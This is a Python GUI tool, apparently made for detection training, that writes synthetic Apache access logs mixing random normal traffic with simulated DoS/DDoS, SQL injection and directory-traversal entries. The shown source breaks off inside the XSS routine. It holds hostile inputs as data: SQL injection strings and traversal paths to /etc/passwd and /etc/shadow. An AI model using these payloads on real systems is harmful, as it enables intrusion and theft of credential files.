from tkinter import *
from ipaddress import IPv4Address
from random import getrandbits, random
import random
import datetime
from fake_useragent import UserAgent
from faker import Faker
import logging
import time
import os
agent = UserAgent()
fake = Faker()



attfreq = 0
randate = None
hour = None
min = None
sec = None
ms = None
rando = 0
choice = 0
traf = 1
mysite = fake.url()
attack1 = None
attack2 = None
dal = 0
lownslow = False
ddos = True
GETFlood = False
attacks=[]
randomdate=True
randomtime = True
custnote=False
trafcyc = 500
loristime = 60
packonce = 10

#----------------------------Creates Log Folder if doesn't exist-------------------------------#
if not os.path.exists("Logs"):
    os.makedirs("Logs")


#----------------------------Gui Menu-------------------------------#
def Apache():

    global freq, ent, whtraf, traffic, var1, var2, var3, var4, var5, var6,txt, dal
    pack=0

    apa = Tk()
    apa.title("Apache Malicious Log Generator")
    apa.resizable(False, False)
    apa.geometry("500x400+500+100")

    head = Label(apa, text="Apache Malicious Log Generator", font="Times 20 bold")
    head.place(x=50,y=50)

    entlab = Label(apa, text="Amount of Packets")
    ent = Entry(apa, bd = 1)
    entlab.place(x=50, y=125)
    ent.place(x=50, y=150)

    def dalby():
        global dal
        if dal == 0:
            dal += 1
        elif dal == 1:
            dal -= 1

    whtraf = IntVar()
    traffic = Checkbutton(apa, text="White Traffic", onvalue=1, offvalue=0, command=lambda:dalby())
    traffic.place(x=50, y=280)



    freq = StringVar(apa)
    freq.set("None")

    optionz = OptionMenu(apa, freq, "Very Frequent","Common", "Less Common" ,"Rare")
    attack5 = Label(apa, text="Attack Frequency")
    attack5.place(x=50, y=175)
    optionz.place(x=50, y=195)

    var1 = StringVar(apa)
    var1.set("None")
    opt = OptionMenu(apa, var1, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
    attack1 = Label(apa, text="First Attack")
    attack1.place(x=250, y=135)
    opt.place(x=350, y=130)

    var2 = StringVar(apa)
    var2.set("None")
    opt2 = OptionMenu(apa, var2, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
    attack2 = Label(apa, text="Second Attack")
    attack2.place(x=250, y=165)
    opt2.place(x=350, y=160)

    var3 = StringVar(apa)
    var3.set("None")
    opt3 = OptionMenu(apa, var3, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
    attack3 = Label(apa, text="Third Attack")
    attack3.place(x=250, y=195)
    opt3.place(x=350, y=190)

    var4 = StringVar(apa)
    var4.set("None")
    opt4 = OptionMenu(apa, var4, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
    attack4 = Label(apa, text="Fourth Attack")
    attack4.place(x=250, y=225)
    opt4.place(x=350, y=220)

    var5 = StringVar(apa)
    var5.set("None")
    opt5 = OptionMenu(apa, var5, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
    attack5 = Label(apa, text="Fifth Attack")
    attack5.place(x=250, y=255)
    opt5.place(x=350, y=250)

    var6 = StringVar(apa)
    var6.set("None")
    opt6 = OptionMenu(apa, var6, "None", "---DoS---","Slowloris","R-U-Dead-Yet","HTTP POST Flood(DoS)", "HTTP GET Flood(DoS)","---DDoS---","HTTP POST Flood(DDoS)","HTTP GET Flood(DDoS)","---Application Side Attacks---","SQL Injection","Directory Traversal Attack", "Cross-Site Scripting(XSS)")
    attack6 = Label(apa, text="Sixth Attack")
    attack6.place(x=250, y=285)
    opt6.place(x=350, y=280)


                    #---Buttons---#

    enter = Button(apa, text="Enter", command=lambda: starterrors())
    enter.place(x=220, y=367)

    openfolder = Button(apa, text="Open Log Folder", command=lambda: os.startfile("Logs"))
    openfolder.place(x=320, y=367)

    other = Button(apa, text="Other Options", command=lambda:OtherOps())
    other.place(x=60, y=367)



    txt = Text(apa, width=47, height=3)
    txt.config(state=DISABLED)
    txt.place(x=50, y=312)

    apa.mainloop()
#----------------------------More Options Menu--------------------------------#

def OtherOps():
    global day,month,year, randomdate, randomtime, randate, hour, min, sec, ms, cfr, trafcyc, attfreq, tim, loristime, packonce, ptim

    alt = Tk()

    day = StringVar(alt)
    day.set("Day")
    month = StringVar(alt)
    month.set("Month")
    year = StringVar(alt)
    year.set("Year")


    hr = StringVar(alt)
    hr.set("Hour")
    mn = StringVar(alt)
    mn.set("Minute")
    sc = StringVar(alt)
    sc.set("Second")

    alt.title("Other Options - Apache Malicious Log Generator")
    alt.resizable(False, False)
    alt.geometry("400x300+550+150")

    LowText = Label(alt, text="Custom Start Date/Time")
    LowText.place(x=30, y=20)
    d = OptionMenu(alt,day,"Day","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31")
    d.place(x=30, y=40)

    m = OptionMenu(alt, month,"Month" ,"Jan","Feb","Mar","Apr","May","Jun","July","Aug","Sept","Oct","Nov","Dec")
    m.place(x=30, y=70)

    y = OptionMenu(alt, year,"Year", "2010","2011","2012","2013","2014","2015","2016","2017","2018","2019","2020")
    y.place(x=30, y=100)

    hourtim = OptionMenu(alt,hr,"Hour","0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23")
    hourtim.place(x=120, y=40)

    mintim = OptionMenu(alt, mn,"Minute","0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59")
    mintim.place(x=120, y=70)

    sectim = OptionMenu(alt, sc,"Second", "0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59")
    sectim.place(x=120, y=100)

    custfreq = Label(alt, text="Custom Frequency")
    cfre=Entry(alt, bd = 1)
    custfreq.place(x=60, y=160)
    cfre.place(x=55, y=185)

    DosText = Label(alt, text="Dos/DDoS Options")
    DosText.place(x=217, y=20)

    alttime = Label(alt, text="Traffic per cycle (Default = 500)")
    tim = Entry(alt, bd = 1)
    alttime.place(x=217, y=45)
    tim.place(x=227, y=70)

    LowText = Label(alt, text="Slowloris/R.U.D.Y Options")
    LowText.place(x=217, y=175)


    alttime = Label(alt, text="Time between Packet burst in Sec\n(Default = 60s)")
    tim2 = Entry(alt, bd = 1)
    alttime.place(x=202, y=205)
    tim2.place(x=227, y=240)

    alt2time = Label(alt, text="Packets at once\n(Default = 10)")
    ptim = Entry(alt, bd = 1)
    alt2time.place(x=247, y=95)
    ptim.place(x=227, y=130)

    confirm = Button(alt, text="Confirm Settings", command=lambda: confirm())
    confirm.place(x=60, y=210)
    clear = Button(alt, text="Restore Default", command=lambda: restore())
    clear.place(x=60, y=240)
    cancel = Button(alt, text="Cancel Settings", command=lambda: alt.destroy())
    cancel.place(x=60, y=270)
    rand= Button(alt, text="Random Date/Time", command=lambda: rand())
    rand.place(x=55, y=135)


    def restore():
        global trafcyc, loristime, packonce
        day.set("Day")
        month.set("Month")
        year.set("Year")
        hr.set("Hour")
        mn.set("Minute")
        sc.set("Second")
        tim.delete(0, END)
        tim2.delete(0, END)
        ptim.delete(0, END)
        cfre.delete(0, END)
        trafcyc = 500
        loristime= 60
        packonce = 10
        rand()
    def confirm():


        global day, month,year,randomdate, randomtime, randate, text, hour, min, sec, ms, cfr, trafcyc, attfreq, tim, loristime, packonce, freq, custnote

        days = day.get()
        monthz = month.get()
        years = year.get()

        hour = hr.get()
        min = mn.get()
        sec = sc.get()
        cyc =tim.get()
        custfr = cfre.get()
        timebet = tim2.get()
        atonce = ptim.get()


        if cyc != "":
            try:
                cfr = int(cyc)
            except ValueError:
                    text ="Error: Invalid Entry"
                    txtbox()
        else:
            cyc = 0
        if custfr != "":
            try:
                custfreq = int(custfr)
                custnote = True
            except ValueError:
                    text ="Error: Invalid Entry"
                    freq.set("None")
                    custfreq=0
                    txtbox()
        else:
            custfreq = 0
        if timebet != "":
            try:
                timebet = int(timebet)
            except ValueError:
                    text ="Error: Invalid Entry"
                    txtbox()
        else:
            timebet = 0

        if atonce != "":
            try:
                atonce = int(atonce)
            except ValueError:
                    text ="Error: Invalid Entry\nPlease enter valid entry"
                    txtbox()
        else:
            atonce = 0
        
        if days == "Day" and monthz == "Month" and years == "Year":
            randomdate = True
        else:

            if monthz == "Jan":
                months = 1
            elif monthz == "Feb":
                months = 2
            elif monthz == "Mar":
                months = 3
            elif monthz == "Apr":
                months = 4
            elif monthz == "May":
                months = 5
            elif monthz == "Jun":
                months = 6
            elif monthz == "July":
                months = 7
            elif monthz == "Aug":
                months = 8
            elif monthz == "Sept":
                months = 9
            elif monthz == "Oct":
                months = 10
            elif monthz == "Nov":
                months = 11
            elif monthz == "Dec":
                months = 12

            if days == str("Day"):
                days = random.randint(1,31)
            if monthz == str("Month"):
                months = random.randint(1,12)
            if years == str("Year"):
                years = random.randint(2010,2020)
            randomdate = False
            try:
                randate= datetime.date(int(years), months, int(days))
                text ="set Date:" + days+"/" +str(months)+"/"+years
            except ValueError:
                text ="Error: Invalid Date\nPlease enter valid date"
                txtbox()
                randomdate = True


            if hour == "Hour" and min == "Minute" and sec == "Second":
                randomtime = True
            else:
                if hour == str("Hour"):
                    hour = random.randint(0,23)
                if min == str("Minute"):
                    min = random.randint(0,59)
                if sec == str("Second"):
                    sec = random.randint(0,59)
                hour = int(hour)
                min = int(min)
                sec = int(sec)
                ms = random.randint(000000,900000)
                randomtime = False

        if cyc != 0:
            trafcyc = int(cyc)

        if custfreq != 0:
            attfreq = custfreq

        if timebet != 0:
            loristime = timebet

        if atonce != 0:
            packonce = int(atonce)

        if custnote == True:
            freq.set("Custom")
            custnote=False








        alt.destroy()

    def rand():
        global randomdate, randomtime
        randomtime = True
        randomdate = True









    alt.mainloop()


#----------------------------Traffic Generation--------------------------------#
#Frequency of attacks on system
def start():

    global pack, whtraf, name, choice, amount,traf, dal,text
    num=time.strftime('%d%m%H%M%S')
    text ="Generating Logs..."
    txtbox()
    name=('Logs/ApacheLog.'+str(num)+'.log')
    pack=ent.get()
    amount =int(pack)
    datime()

    if dal == 1:

        fr()
        whitetraffic()
        text ="Logs Generated W/ Traffic"
        txtbox()
        traf=1
    elif dal == 0:
        fr()
        mulatt()
        text ="Logs Generated W/O Traffic"
        txtbox()
        traf=1

#---------------------Error Section-------------------=
def starterrors():
    global text
    pack=ent.get()

    att = var1.get()
    att2= var2.get()
    att3= var3.get()
    att4= var4.get()
    att5= var5.get()
    att6= var6.get()

    if pack == '':
        text ="Error: Packet amount left empty\nPlease enter an amount"
        txtbox()
    elif dal == 0 and att == "None" and att2 == "None" and att3 == "None" and att4 == "None" and att5 == "None" and att6 == "None":
        text ="Error: fields left empty\nPlease make selections"
        txtbox()
    elif pack.isnumeric()!= True:
        text ="Error: Amount is not a valid number\nPlease enter a number"
        txtbox()
    elif att ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
        text ="Error: Header is not a valid selection\nPlease try again"
        txtbox()
    elif att2 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
        text ="Error: Header is not a valid selection\nPlease try again"
        txtbox()
    elif att3 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
        text ="Error: Header is not a valid selection\nPlease try again"
        txtbox()
    elif att4 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
        text ="Error: Header is not a valid selection\nPlease try again"
        txtbox()
    elif att5 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
        text ="Error: Header is not a valid selection\nPlease try again"
        txtbox()
    elif att6 ==  "---DoS---" or att =="---DDoS---"or att == "---Application Side Attacks---":
        text ="Error: Header is not a valid selection\nPlease try again"
        txtbox()
    else:
        start()





#Frequency of attacks on system
def fr():
    global attfreq, dal
    op= freq.get()

    if op == "Very Frequent":
        attfreq = 25
    elif op == "Common":
        attfreq = 100
    elif op == "Less Common":
        attfreq = 200
    elif op == "Rare":
        attfreq = 300
    elif op == "None":
        if dal == 0:
            attfreq = 1
        elif dal == 1:
            attfreq = 0


#Time stamp for server
def datime():
    global randate, hour, min, sec, ms
    if randomdate == True:
        stdate = datetime.date(2010, 1, 1)
        enddate = datetime.date(2020, 12, 31)
        betweendates = enddate - stdate
        betweendates = betweendates.days
        randays = random.randrange(betweendates)
        randate = stdate + datetime.timedelta(days=randays)

    if randomtime == True:
        #generate time
        hour = random.randint(00,23)
        min = random.randint(00,59)
        sec = random.randint(00,59)
        ms = random.randint(000000,900000)


#Random white traffic to add to realism
def whitetraffic():
    global randate, hour, min, sec, ms, ts, name, traf, mysite,  saved, attfreq
    respans=0
    noget = 0
    n=time.localtime()
    t=0
    att = var1.get()
    att2= var2.get()
    att3= var3.get()
    att4= var4.get()
    att5= var5.get()
    att6= var6.get()

    while traf <= amount:
        def srcip():
            global src
            bits = getrandbits(32)
            addr = IPv4Address(bits)
            src = str(addr)
        srcip()
        ag = agent.random
        noget= random.randint(1,500)
        if noget == 2:
            action = ("POST","PUT","DELETE")
            msg=random.choice(action)
        else:
            msg = "GET"
        respans = random.randint(1,6)
        if respans == 5:
            response=["404","500","301"]
        else:
            response = ["200"]
        resp=random.choice(response)
        srcport = random.randint(0,65535)
        desport = 80
        size=random.randint(0,100000)
        dt =datetime.time(hour=hour, minute=min, second=sec)
        st = datetime.datetime.combine(randate, dt)
        ts = st.strftime('%d/%b/%Y:%H:%M:%S')
        logging.basicConfig(level=logging.INFO, format='%(message)s')
        logger = logging.getLogger()
        logger.addHandler(logging.FileHandler(name, 'a'))
        id=random.randint(0,2000)
        direct=("about","?search=","?search="+fake.word(),"login","profile/"+fake.user_name(),"sitemap","blog","blog/"+fake.word(),"messages","merch","contact-us",".robots.txt","")
        dircho= random.choice(direct)
        direct2=("/about","/search","/?search="+fake.word(),"/login","/profile/"+fake.user_name(),"/sitemap","/blog","/blog/"+fake.word(),"/messages","/merch","/contact-us","/.robots.txt")
        dircho2= random.choice(direct2)
        logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho2,resp,size,mysite,dircho,ag))
        rand=random.randint(1,60)
        sec+=rand
        if sec>= 60:
            min+=1
            sec-=60
        if min>=60:
            hour+=1
            min=0
        if hour>=24:
            randate = randate + datetime.timedelta(days=1)
            hour=0
        logger.handlers.clear()
        traf+=1
        m=0

        if att != 0 or att2 != 0 or att3 != 0 or att4 != 0 or att5 != 0 or att6 != 0:
            mulatt()


#----------------------------Attack Selection-------------------------------
def mulatt():
    global launch1,launch2,launch3,launch4, launch5, launch6, ddos, GETFlood, text, lownslow
    att = var1.get()
    att2= var2.get()
    att3= var3.get()
    att4= var4.get()
    att5= var5.get()
    att6= var6.get()

    if att == "None":
        launch1 = 0
    elif att == "Slowloris":
        launch1 = 1
        dosip()
    elif att == "HTTP POST Flood(DoS)":
        launch1 = 2
        dosip()
    elif att == "SQL Injection":
        launch1 = 3
    elif att == "Directory Traversal Attack":
        launch1 = 4
    elif att == "Cross-Site Scripting(XSS)":
        launch1 = 5
    elif att == "R-U-Dead-Yet":
        launch1 = 6
        dosip()
    elif att == "HTTP POST Flood(DDoS)":
        launch1 = 7
    elif att == "HTTP GET Flood(DoS)":
        launch1 = 8
        dosip()
    elif att == "HTTP GET Flood(DDoS)":
        launch1 = 9





    if att2 == "None":
        launch2 = 0
    elif att2 == "Slowloris":
        launch2 = 1
        dosip()
    elif att2 == "HTTP POST Flood(DoS)":
        launch2 = 2
        dosip()
    elif att2 == "SQL Injection":
        launch2 = 3
    elif att2 == "Directory Traversal Attack":
        launch2 = 4
    elif att2 == "Cross-Site Scripting(XSS)":
        launch2 = 5
    elif att2 == "R-U-Dead-Yet":
        launch2 = 6
        dosip()
    elif att2 == "HTTP POST Flood(DDoS)":
        launch2 = 7
    elif att2 == "HTTP GET Flood(DoS)":
        launch2 = 8
        dosip()
    elif att2 == "HTTP GET Flood(DDoS)":
        launch2 = 9



    if att3 == "None":
        launch3 = 0
    elif att3 == "Slowloris":
        launch3 = 1
        dosip()
    elif att3 == "HTTP POST Flood(DoS)":
        launch3 = 2
        dosip()
    elif att3 == "SQL Injection":
        launch3 = 3
    elif att3 == "Directory Traversal Attack":
        launch3 = 4
    elif att3 == "Cross-Site Scripting(XSS)":
        launch3 = 5
    elif att3 == "R-U-Dead-Yet":
        launch3 = 6
        dosip()
    elif att3 == "HTTP POST Flood(DDoS)":
        launch3 = 7
    elif att3 == "HTTP GET Flood(DoS)":
        launch3 = 8
        dosip()
    elif att3 == "HTTP GET Flood(DDoS)":
        launch3 = 9




    if att4 == "None":
        launch4 = 0
    elif att4 == "Slowloris":
        launch4 = 1
        dosip()
    elif att4 == "HTTP POST Flood(DoS)":
        launch4 = 2
        dosip()
    elif att4 == "SQL Injection":
        launch4 = 3
    elif att4 == "Directory Traversal Attack":
        launch4 = 4
    elif att4 == "Cross-Site Scripting(XSS)":
        launch4 = 5
    elif att4 == "R-U-Dead-Yet":
        launch4 = 6
        dosip()
    elif att4 == "HTTP POST Flood(DDoS)":
        launch4 = 7
    elif att4 == "HTTP GET Flood(DoS)":
        launch4 = 8
        dosip()
    elif att4 == "HTTP GET Flood(DDoS)":
        launch4 = 9



    if att5 == "None":
        launch5 = 0
    elif att5 == "Slowloris":
        launch5 = 1
        dosip()
    elif att5 == "HTTP POST Flood(DoS)":
        launch5 = 2
        dosip()
    elif att5 == "SQL Injection":
        launch5 = 3
    elif att5 == "Directory Traversal Attack":
        launch5 = 4
    elif att5 == "Cross-Site Scripting(XSS)":
        launch5 = 5
    elif att5 == "R-U-Dead-Yet":
        launch5 = 6
        dosip()
    elif att5 == "HTTP POST Flood(DDoS)":
        launch5 = 7
    elif att5 == "HTTP GET Flood(DoS)":
        launch5 = 8
        dosip()
    elif att5 == "HTTP GET Flood(DDoS)":
        launch5 = 9


    if att6 == "None":
        launch6 = 0
    elif att6 == "Slowloris":
        launch6 = 1
        dosip()
    elif att6 == "HTTP POST Flood(DoS)":
        launch6 = 2
        dosip()
    elif att6 == "SQL Injection":
        launch6 = 3
    elif att6 == "Directory Traversal Attack":
        launch6 = 4
    elif att6 == "Cross-Site Scripting(XSS)":
        launch6 = 5
    elif att6 == "R-U-Dead-Yet":
        launch6 = 6
        dosip()
    elif att6 == "HTTP POST Flood(DDoS)":
        launch6 = 7
    elif att6 == "HTTP GET Flood(DoS)":
        launch6 = 8
        dosip()
    elif att6 == "HTTP GET Flood(DDoS)":
        launch6 = 9






    def mulattlaunch():
        global launch1,launch2,launch3,launch4, launch5, launch6, ddos, GETFlood, lownslow,dal
        listed = [launch1,launch2,launch3,launch4, launch5, launch6]
        while 0 in listed:
            listed.remove(0)

        att=random.choice(listed)
        if att == 1:
            lownslow = False
            slowloris()
        elif att == 2:
            ddos = False
            GETFlood = False
            httpflood()
        elif att == 3:
            sqlattack()
        elif att == 4:
            dotdotslash()
        elif att == 5:
            xss()
        elif att == 6:
            lownslow = True
            slowloris()
        elif att == 7:
            ddos = True
            GETFlood = False
            httpflood()
        elif att == 8:
            ddos = False
            GETFlood = True
            httpflood()
        elif att == 9:
            ddos = True
            GETFlood = True
            httpflood()


        else:
            mulattlaunch()

    if dal == 0:
        while traf <= amount:
            mulattlaunch()

    if launch1 != 0 or launch2 != 0 or launch3 != 0 or launch4 != 0 or launch5 != 0 or launch6 != 0:
        attackspring = random.randint(1,attfreq)
        if attackspring == 1:
            mulattlaunch()





#----------------------------Extra Bits of Traffic-------------------------------

def dosip():
    global dsrc, ag
    bits = getrandbits(32)
    addr = IPv4Address(bits)
    dsrc = str(addr)
    ag = agent.random







def insidedosatt():
    listed = [launch1,launch2,launch3,launch4]
    while 0 in listed:
        listed.remove(0)
    while 1 in listed:
        listed.remove(1)
    while 1 in listed:
        listed.remove(2)

    if len(listed) != 0:
        insatt=random.choice(listed)
        if insatt == 3:
            sqlattack()
        elif insatt == 4:
            dotdotslash()
        elif insatt == 5:
            xss()



def onewhite():
    global randate, hour, min, sec, ms, ts, name, traf, mysite,  saved, attfreq
    n=time.localtime()
    t=0
    respans = 0
    noget = 0

    def srcip():
        global src
        bits = getrandbits(32)
        addr = IPv4Address(bits)
        src = str(addr)
    srcip()
    ag = agent.random
    noget= random.randint(1,6)
    if respans == 5:
        action = ("POST","PUT","DELETE")
        msg=random.choice(action)
    else:
        msg = "GET"

    respans = random.randint(1,2000)
    if respans == 5:
        response=["404","500","301"]
    else:
        response = ["200"]
    resp=random.choice(response)

    srcport = random.randint(0,65535)
    desport = 80
    size=random.randint(0,10000)

    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
    st = datetime.datetime.combine(randate, dt)
    ts = st.strftime('%d/%b/%Y:%H:%M:%S')
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    logger = logging.getLogger()
    logger.addHandler(logging.FileHandler(name, 'a'))
    id=random.randint(0,2000)
    direct=("about","search","?search="+fake.word(),"login","profile/"+fake.user_name(),"sitemap","blog","blog/"+fake.word(),"messages","merch","contact-us",".robots.txt","")
    dircho= random.choice(direct)
    direct2=("/about","/search","/?search="+fake.word(),"/login","/profile/"+fake.user_name(),"/sitemap","/blog","/blog/"+fake.word(),"/messages","/merch","/contact-us","/.robots.txt")
    dircho2= random.choice(direct2)
    logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho2,resp,size,mysite,dircho,ag))
    if sec>= 60:
        min+=1
        sec-=60
    if min>=60:
        hour+=1
        min=0
    if hour>=24:
       randate = randate + datetime.timedelta(days=1)
       hour=0

    logger.handlers.clear()
    traf+=1
    m=0







def txtbox():
    global txt,text
    txt.config(state=NORMAL)
    txt.insert(INSERT, text + '\n')
    txt.yview_pickplace("end")
    txt.config(state=DISABLED)





#----------------------------Attacks-------------------------------




#----------------------------DoS/DDoS-------------------------------




#Creates a Slowloris DoS attack
dec =0
def slowloris():
    global randate, hour, min, sec, ms, mysite, ts, traf, amount, lownslow, trafcyc, loristime,packonce
    t=0
    #Generate Destination IP
    g=1
    ag = agent.random
    n=time.localtime()
    resp=408
    amount =int(pack)

    while g <= trafcyc and traf <= amount:
        if lownslow == True:
            msg ="POST"
        else:
            msg="GET"

        srcport = random.randint(0,65535)
        desport = 80
        size=0
        dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
        st = datetime.datetime.combine(randate, dt)
        ts = st.strftime('%d/%b/%Y:%H:%M:%S')
        logging.basicConfig(level=logging.INFO, format='%(message)s')
        logger = logging.getLogger()
        logger.addHandler(logging.FileHandler(name, 'a'))
        id=random.randint(0,2000)
        logger.info('%s - - [%s +0000] "%s / %s HTTP/1.1" %s %s "-" "%s"' % (dsrc,ts,msg,id,resp,size,ag))

        if t == packonce:
            sec+=loristime
            t-=packonce
            if resp == 400:
                resp = 408
            elif resp == 408:
                resp = 400
        t+=1
        while sec>= 60:
            min+=1
            sec-=60

        while min>=60:
            hour+=1
            min-=60

        while hour>=24:
            randate = randate + datetime.timedelta(days=1)
            hour-=60

        logger.handlers.clear()
        g+=1
        traf +=1
        trafspring = random.randint(1,25)
        if trafspring == 2 and dal == 1:
            onewhite()
        attackspring = random.randint(1,attfreq)
        if attackspring == 1:
            insidedosatt()
    g=0
    t-=packonce





def httpflood():
    global randate, hour, min, sec, ms,ddos, amount, traf, trafcyc,amount, GETFlood, ag
    global ts
    amount =int(pack)
    g=1

    t=0
    while g <= trafcyc and traf <= amount:
        resp=408
        if ddos == True:
            global dsrc
            bits = getrandbits(32)
            addr = IPv4Address(bits)
            dsrc = str(addr)
            ag = agent.random
        if GETFlood == True:
            msg ="GET"
        else:
            msg="POST"

        srcport = random.randint(0,65535)
        desport = 80
        size=394
        resp=200
        id=random.randint(0,2000)
        dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
        st = datetime.datetime.combine(randate, dt)
        ts = st.strftime('%d/%b/%Y:%H:%M:%S')
        logging.basicConfig(level=logging.INFO, format='%(message)s')
        logger = logging.getLogger()
        logger.addHandler(logging.FileHandler(name, 'a'))

        logger.info('%s - - [%s +0000] "%s / %s HTTP/1.1" %s %s "-" "%s"' % (dsrc,ts,msg,id,resp,size,ag))
        t+=1
        g+=1
        traf += 1
        if t >= packonce:
            sec += 1
            t -= packonce

        while sec>= 60:
            min+=1
            sec-=60
        while min>=60:
            hour+=1
            min=0
        while hour>=24:
            randate = randate + datetime.timedelta(days=1)
            hour=0
        logger.handlers.clear()

        trafspring = random.randint(1,3)
        if trafspring == 2 and dal == 1:
            onewhite()
        attackspring = random.randint(1,attfreq)
        if attackspring == 1:
            insidedosatt()


    t-=packonce
    g=0



#----------------------------Application Based Attacks-------------------------------

def sqlattack():
    global randate, hour, min, sec, ms, traf, ddos, src
    t=0
    def srcip():
        global src
        bits = getrandbits(32)
        addr = IPv4Address(bits)
        src = str(addr)
    srcip()


    if ddos == False:
        src = dsrc
    ag = agent.random
    resp=200
    msg="GET"
    size=random.randint(1000,8000)
    tz= -7000
    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
    st = datetime.datetime.combine(randate, dt)
    ts = st.strftime('%d/%b/%Y:%H:%M:%S')
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    logger = logging.getLogger()
    logger.addHandler(logging.FileHandler(name, 'a'))
    dircho= "search/"
    sqlichoice=random.randint(1,4)


    if sqlichoice == 1:
        dircho2="login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit"
    elif sqlichoice == 2:
        dircho2="login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit"
    elif sqlichoice == 3:
        dircho2="login/?id=admin%27+--"
    elif sqlichoice == 4:
        dircho2="login/?id=%27+or+1=1%23"
    elif sqlichoice == 5:
        dircho2="?id=%27%29+or+%271%27%3D%271--"

    logger.info('%s - - [%s +0000] "%s %s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho2,resp,size,mysite,dircho,ag))

    t+=1
    if t >= 420:
        sec += 1
        t -= 420

    while sec>= 60:
            min+=1
            sec-=60
    while min>=60:
        hour+=1
        min=0
    while hour>=24:
        randate = randate + datetime.timedelta(days=1)
        hour=0
    traf+=1

    logger.handlers.clear()

def dotdotslash():
    global randate, hour, min, sec, ms, traf, ddos, src
    t=0
    def srcip():
        global src
        bits = getrandbits(32)
        addr = IPv4Address(bits)
        src = str(addr)

    srcip()
    if ddos == False:
        src = dsrc
    ag = agent.random
    resp=200
    msg="GET"
    size=random.randint(1000,8000)
    tz= -7000
    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
    st = datetime.datetime.combine(randate, dt)
    ts = st.strftime('%d/%b/%Y:%H:%M:%S')
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    logger = logging.getLogger()
    logger.addHandler(logging.FileHandler(name, 'a'))
    dircho= "search/"
    slashchoice=random.randint(1,5)
    filechoice=random.randint(1,4)

    direct=("about","search","search/"+fake.word(),"login","profile/"+fake.user_name(),"sitemap","blog","blog/"+fake.word(),"messages","merch","contact-us",".robots.txt","")
    dircho= random.choice(direct)


    if filechoice == 1:
        dircho3="get.php?file="
    elif filechoice == 2:
        dircho3="get-files?file="
    elif filechoice == 3:
        dircho3="main.cgi?file="
    elif filechoice == 4:
        dircho3=""

    if slashchoice == 1:
        dircho2="../../../../etc/passwd"
    elif slashchoice == 2:
        dircho2="../../../../etc/shadow"
    elif slashchoice == 3:
        dircho2="..\..\..\..\..\..\winnt\win.ini"
    elif slashchoice == 4:
        dircho2="../../../../apache/logs/access.log"
    elif slashchoice == 5:
        dircho2="../../../../apache/logs/error.log"



    logger.info('%s - - [%s +0000] "%s %s%s HTTP/1.1" %s %s "%s%s" "%s"' % (src,ts,msg,dircho3,dircho2,resp,size,mysite,dircho,ag))

    t+=1
    if t >= 420:
        sec += 1
        t -= 420

    while sec>= 60:
        min+=1
        sec-=60
    while min>=60:
        hour+=1
        min=0
    while hour>=24:
        rndate = randate + datetime.timedelta(days=1)
        hour=0

    traf +=1
    logger.handlers.clear()



def xss():
    global randate, hour, min, sec, ms, traf, ddos, src
    t=0
    def srcip():
        global src
        bits = getrandbits(32)
        addr = IPv4Address(bits)
        src = str(addr)

    srcip()

    def attip():
        global atip
        bits = getrandbits(32)
        addr = IPv4Address(bits)
        atip = str(addr)
    def malurl():
        global murl
        murl = random.randint(1000, 999999)

    if ddos == False:
        src = dsrc
    ag = agent.random
    resp=200
    msg="GET"
    size=random.randint(1000,8000)
    tz= -7000
    dt =datetime.time(hour=hour, minute=min, second=sec, microsecond=ms)
    st = datetime.datetime.combine(randate, dt)
